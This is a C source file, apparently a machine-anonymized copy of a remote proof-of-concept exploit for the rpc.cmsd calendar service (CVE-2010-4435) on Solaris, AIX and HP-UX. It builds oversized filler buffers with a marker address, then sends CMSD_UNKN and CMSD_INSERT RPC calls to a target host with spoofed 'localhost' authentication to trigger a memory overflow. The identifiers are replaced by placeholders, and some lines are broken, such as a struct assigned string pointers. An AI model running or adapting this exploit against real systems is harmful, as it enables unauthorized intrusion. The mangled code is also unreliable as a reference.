
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_5__ TYPE_1__ ;


struct timeval {int member_0; int member_1; } ;
struct cm_send2 {char* s1; char* s2; } ;
struct cm_send {char* s1; char* s2; } ;
struct cm_reply {int dummy; } ;
typedef enum clnt_stat { ____Placeholder_clnt_stat } clnt_stat ;
typedef int caddr_t ;
typedef int buf2 ;
typedef int buf ;
struct TYPE_5__ {int cl_auth; } ;
typedef TYPE_1__ CLIENT ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int FUNC_0 (char*,int ,int ,int ,int *) ;
 int FUNC_1 (TYPE_1__*,int ,int ,int ,int ,int ,struct timeval) ;
 TYPE_1__* FUNC_2 (char*,int ,int ,char*) ;
 int FUNC_3 (TYPE_1__*) ;
 int FUNC_4 (char*) ;
 int FUNC_5 (int) ;
 int FUNC_6 (char*,char*,int) ;
 int FUNC_7 (char*,int,int) ;
 int FUNC_8 (char*,...) ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;

int
FUNC_9(int VAR_7, char *VAR_8[])
{
   char VAR_9[2048], VAR_10[256];
   long VAR_11, VAR_12;
   int VAR_13, VAR_14, VAR_15, VAR_16;
   char *VAR_17, *VAR_18;

   CLIENT *VAR_19;
   struct cm_send VAR_20;
   struct cm_send2 VAR_21;
   struct cm_reply VAR_22;
   struct timeval VAR_23 = { 10, 0 };
   enum clnt_stat VAR_24;

   FUNC_8("<< rpc.cmsd remote PoC (CVE-2010-4435), tested against Solaris, AIX, HP-UX >>\n");
   FUNC_8("<< Rodrigo Rubira Branco (BSDaemon) - <rodrigo *noSPAM* kernelhacking.com> >>\n");
   FUNC_8("<< http://www.kernelhacking.com/rodrigo >>\n");
   FUNC_8("<< http://www.risesecurity.org >>\n");

   if(VAR_7 < 2) {
      FUNC_8("Usage: %s [hostname]\n", VAR_8[0]);
      FUNC_5(1);
   }

   VAR_17 = VAR_8[1];

   FUNC_7(VAR_9,0x60,sizeof(VAR_9)-1);
   FUNC_7(VAR_10,0x44,sizeof(VAR_10)-1);
   FUNC_6(VAR_9+292,"\xaa\xbb\xcc\xdd",4);

   VAR_20.s1 = VAR_9;
   VAR_20.s2 = "";
   VAR_21 = VAR_10;
   VAR_21 = "";

   FUNC_8("\nSending CMSD_UNKN to the server ... ");

   if(!(VAR_19=FUNC_2(VAR_17,VAR_1,VAR_3,"udp"))){
        FUNC_4("\nerror");FUNC_5(-1);
   }
   VAR_24=FUNC_1(VAR_19, VAR_2, VAR_5, (caddr_t) &VAR_20,
                        VAR_4, (caddr_t) &VAR_22, VAR_23);

   FUNC_3(VAR_19);

   FUNC_8("done!\n");

   FUNC_8("Sending CMSD_INSERT procedure ... ");

   if(!(VAR_19=FUNC_2(VAR_17,VAR_1,VAR_3,"udp"))){
 FUNC_4("\nerror");FUNC_5(-1);
   }

   VAR_19->cl_auth = FUNC_0("localhost", 0, 0, 0, ((void*)0));
   VAR_24=FUNC_1(VAR_19, VAR_0, VAR_6, (caddr_t) &VAR_21,
                        VAR_4, (caddr_t) &VAR_22, VAR_23);

   FUNC_8("done!\n");
   FUNC_3(VAR_19);

}
